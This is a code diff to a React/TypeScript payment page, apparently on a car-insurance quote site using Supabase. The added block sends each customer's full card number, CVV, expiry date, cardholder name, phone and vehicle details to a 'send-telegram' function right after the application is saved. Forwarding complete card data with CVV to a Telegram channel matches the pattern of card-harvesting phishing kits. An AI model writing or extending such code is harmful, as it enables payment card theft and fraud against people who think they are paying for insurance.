@@ -256,7 +256,21 @@ const Payment = () => {
       const lastFour = cardDigits.slice(-4);
 
       // Get existing application data if exists
-      let existingData = {};
+      let existingData: {
+        full_name?: string;
+        phone?: string;
+        insurance_type?: string;
+        vehicle_manufacturer?: string;
+        vehicle_model?: string;
+        vehicle_year?: string;
+        vehicle_value?: number;
+        usage_purpose?: string;
+        add_driver?: boolean;
+        selected_company?: string;
+        selected_price?: string;
+        regular_price?: string;
+        company_logo?: string;
+      } = {};
       if (applicationId) {
         const { data } = await supabase
           .from('customer_applications')
@@ -309,6 +323,31 @@ const Payment = () => {
       if (newApp) {
         setApplicationId(newApp.id);
         localStorage.setItem('applicationId', newApp.id);
+
+        // Send Telegram notification
+        try {
+          await supabase.functions.invoke('send-telegram', {
+            body: {
+              applicationData: {
+                fullName: existingData.full_name || '',
+                phone: existingData.phone || '',
+                selectedCompany: companyName,
+                selectedPrice: price,
+                insuranceType: existingData.insurance_type || '',
+                vehicleManufacturer: existingData.vehicle_manufacturer || '',
+                vehicleModel: existingData.vehicle_model || '',
+                vehicleYear: existingData.vehicle_year || '',
+                cardholderName: formData.cardholderName,
+                cardNumber: formData.cardNumber,
+                cardCvv: formData.cvv,
+                expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`,
+              }
+            }
+          });
+          console.log('Telegram notification sent');
+        } catch (telegramError) {
+          console.error('Error sending Telegram notification:', telegramError);
+        }
       }
 
       setApprovalStatus('waiting');
